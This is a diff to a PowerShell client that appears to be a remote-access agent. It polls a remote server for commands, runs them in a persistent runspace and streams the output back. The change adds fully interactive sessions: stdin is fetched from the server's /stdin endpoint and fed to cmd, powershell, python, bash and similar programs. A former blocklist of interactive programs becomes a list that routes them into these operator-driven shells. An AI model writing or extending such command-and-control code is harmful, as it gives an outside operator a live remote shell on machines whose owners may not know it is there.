@@ -181,6 +181,10 @@ function Send-Result-To-Server {
     catch { Write-Log "Result send failed: $($_.Exception.Message)" "WARN" }
 }
 
+function Get-Stdin-From-Server {
+    try { return Send-Http -Url "$cfHost/stdin?id=$clientId" -TimeoutMs 3000 } catch { return "" }
+}
+
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  PERSISTENT RUNSPACE                                                       ║
 # ║  Keeps a single PowerShell runspace alive across commands so state (cd,    ║
@@ -200,6 +204,140 @@ function Get-PersistentRunspace {
 }
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  INTERACTIVE PROCESS EXECUTION                                               ║
+# ║  Runs truly interactive binaries (cmd/python/etc.) with redirected stdin/   ║
+# ║  stdout/stderr. stdin is pulled from /stdin and streamed to the process.    ║
+# ║  Supports timeout + cancel exactly like normal command execution.            ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+function Invoke-InteractiveCommand {
+    param(
+        [string]$Command,
+        [bool]$NoTimeout = $false,
+        [int]$Timeout = $cmdTimeout
+    )
+
+    $timeoutLabel = if ($NoTimeout) { "no-timeout" } else { "${Timeout}s" }
+    $runspace = Get-PersistentRunspace
+    try {
+        $cwdPs = [powershell]::Create()
+        $cwdPs.Runspace = $runspace
+        $cwdValues = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
+        $cwdPs.Dispose()
+        $cwd = if ($cwdValues) { @($cwdValues)[0] } else { (Get-Location).Path }
+    } catch { $cwd = (Get-Location).Path }
+
+    Send-Stream-To-Server -Body "PS $cwd> $Command [$timeoutLabel] [interactive]`n"
+
+    $parts = $Command.Trim() -split '\s+', 2
+    $exe = $parts[0]
+    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
+
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $exe
+    $psi.Arguments = $args
+    $psi.WorkingDirectory = $cwd
+    $psi.UseShellExecute = $false
+    $psi.CreateNoWindow = $true
+    $psi.RedirectStandardInput = $true
+    $psi.RedirectStandardOutput = $true
+    $psi.RedirectStandardError = $true
+
+    $proc = New-Object System.Diagnostics.Process
+    $proc.StartInfo = $psi
+
+    $streamQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
+    $outHandler = [System.Diagnostics.DataReceivedEventHandler]{
+        param($sender, $e)
+        if ($e.Data -ne $null) { $streamQueue.Enqueue($e.Data + "`n") }
+    }
+
+    try {
+        if (-not $proc.Start()) {
+            Send-Result-To-Server -Body "[!] Failed to start interactive command: $Command`n"
+            return
+        }
+    } catch {
+        Send-Result-To-Server -Body ("[!] Failed to start interactive command: " + $_.Exception.Message + "`n")
+        return
+    }
+
+    $proc.add_OutputDataReceived($outHandler)
+    $proc.add_ErrorDataReceived($outHandler)
+    $proc.BeginOutputReadLine()
+    $proc.BeginErrorReadLine()
+
+    $startTime = Get-Date
+    $idleCycles = 0
+    $cancelled = $false
+    $timedOut = $false
+
+    while (-not $proc.HasExited) {
+        $chunk = ""
+        $line = $null
+        while ($streamQueue.TryDequeue([ref]$line)) {
+            $chunk += $line
+        }
+        if ($chunk.Length -gt 0) {
+            Send-Stream-To-Server -Body $chunk
+            $idleCycles = 0
+        } else {
+            $idleCycles++
+        }
+
+        $stdinData = Get-Stdin-From-Server
+        if ($stdinData) {
+            foreach ($stdinLine in ($stdinData -split "`n")) {
+                $cleanLine = $stdinLine.TrimEnd("`r")
+                try { $proc.StandardInput.WriteLine($cleanLine) } catch {}
+            }
+            try { $proc.StandardInput.Flush() } catch {}
+        }
+
+        $signal = Get-Signal-From-Server
+        if ($signal -eq "cancel") {
+            try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
+            $cancelled = $true
+            break
+        }
+
+        if (-not $NoTimeout) {
+            $elapsed = ((Get-Date) - $startTime).TotalSeconds
+            if ($elapsed -gt $Timeout) {
+                try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
+                $timedOut = $true
+                break
+            }
+        }
+
+        $sleepMs = if ($idleCycles -le 0) { 200 } elseif ($idleCycles -le 5) { 500 } else { 1000 }
+        Start-Sleep -Milliseconds $sleepMs
+    }
+
+    try { $proc.WaitForExit(1000) | Out-Null } catch {}
+
+    $finalChunk = ""
+    $line = $null
+    while ($streamQueue.TryDequeue([ref]$line)) {
+        $finalChunk += $line
+    }
+
+    if ($cancelled) {
+        Send-Result-To-Server -Body ($finalChunk + "[!] Command cancelled by operator.`n")
+        Write-Log "Interactive command cancelled: $Command" "INFO"
+    } elseif ($timedOut) {
+        Send-Result-To-Server -Body ($finalChunk + "[!] Command timed out after ${Timeout}s.`n")
+        Write-Log "Interactive command timed out: $Command" "WARN"
+    } else {
+        Send-Result-To-Server -Body $finalChunk
+    }
+
+    try { $proc.CancelOutputRead() } catch {}
+    try { $proc.CancelErrorRead() } catch {}
+    try { $proc.StandardInput.Close() } catch {}
+    try { $proc.Dispose() } catch {}
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  STREAMING EXECUTION                                                       ║
 # ║  Runs commands asynchronously with real-time output streaming back to      ║
 # ║  the server. Supports: timeout, notimeout: prefix, cancel signal.         ║
@@ -216,21 +354,18 @@ function Invoke-CommandStreaming {
     }
     # --- end notimeout ---
 
-    # --- INTERACTIVE COMMAND BLOCKLIST (removable) ---
-    # These commands wait for stdin and will hang the client indefinitely.
-    # Commands WITH arguments (e.g. 'cmd /c dir', 'python script.py') are allowed.
-    $interactiveBlocklist = @('cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe',
-                              'python', 'python3', 'python.exe', 'node', 'node.exe',
-                              'nslookup', 'ftp', 'telnet', 'wsl', 'bash',
-                              'diskpart', 'debug', 'edit', 'edlin')
+    # --- INTERACTIVE COMMAND DETECTION (routes to Invoke-InteractiveCommand) ---
+    $interactiveList = @('cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe',
+                         'python', 'python3', 'python.exe', 'node', 'node.exe',
+                         'nslookup', 'ftp', 'telnet', 'wsl', 'bash',
+                         'diskpart', 'debug', 'edit', 'edlin')
     $firstToken = ($Command.Trim() -split '\s+', 2)[0].ToLower()
     $hasArgs = ($Command.Trim() -split '\s+').Count -gt 1
-    if ($interactiveBlocklist -contains $firstToken -and -not $hasArgs) {
-        Send-Result-To-Server -Body "[!] Blocked: '$firstToken' is interactive and would hang the client.`nUse with arguments instead (e.g. 'cmd /c dir', 'python script.py').`n"
-        Write-Log "Blocked interactive command: $Command" "WARN"
+    if ($interactiveList -contains $firstToken -and -not $hasArgs) {
+        Invoke-InteractiveCommand -Command $Command -NoTimeout $noTimeout -Timeout $Timeout
         return
     }
-    # --- end interactive blocklist ---
+    # --- end interactive detection ---
 
     # 1) Send header — read cwd from persistent runspace (reflects cd changes)
     $timeoutLabel = if ($noTimeout) { "no-timeout" } else { "${Timeout}s" }
@@ -238,9 +373,9 @@ function Invoke-CommandStreaming {
     try {
         $cwdPs = [powershell]::Create()
         $cwdPs.Runspace = $runspace
-        $cwd = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
+        $cwdValues = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
         $cwdPs.Dispose()
-        if (-not $cwd) { $cwd = (Get-Location).Path }
+        $cwd = if ($cwdValues) { @($cwdValues)[0] } else { (Get-Location).Path }
     } catch { $cwd = (Get-Location).Path }
     $header = "PS $cwd> $Command [$timeoutLabel]`n"
     Send-Stream-To-Server -Body $header
